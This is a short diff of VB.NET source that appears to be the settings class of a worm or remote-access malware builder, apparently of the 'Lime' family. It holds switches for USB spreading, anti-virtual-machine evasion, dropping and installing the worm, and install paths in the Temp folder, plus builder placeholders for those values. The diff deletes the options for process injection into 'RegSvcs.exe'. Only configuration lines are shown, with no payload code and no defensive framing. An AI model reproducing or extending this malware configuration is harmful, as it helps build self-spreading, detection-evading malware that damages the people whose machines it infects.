@@ -16,8 +16,6 @@
     Public Shared PIN As Boolean = False 'pin spread
     Public Shared ANTI As Boolean = False 'anti virtual machines
     Public Shared DROP As Boolean = False 'drop and install worm
-    Public Shared INJ_CHK As Boolean = False 'injection
-    Public Shared INJ_Name As String = "RegSvcs.exe" 'injection file
     Public Shared PATH1 As String = "Temp" 'Main Folder
     Public Shared PATH2 As String = "Lime" 'Sub Folder
     Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
@@ -38,8 +36,6 @@
     Public Shared PIN As Boolean = "%PIN%"
     Public Shared ANTI As Boolean = "%ANTI%"
     Public Shared DROP As Boolean = "%DROP%"
-    Public Shared INJ_CHK As Boolean = "%INJ_CHK%"
-    Public Shared INJ_Name As String = "%INJ_NAME%"
     Public Shared PATH1 As String = "%PATH1%"
     Public Shared PATH2 As String = "%PATH2%"
     Public Shared fullpath = Environ(PATH1) & PATH2 & "\" & EXE
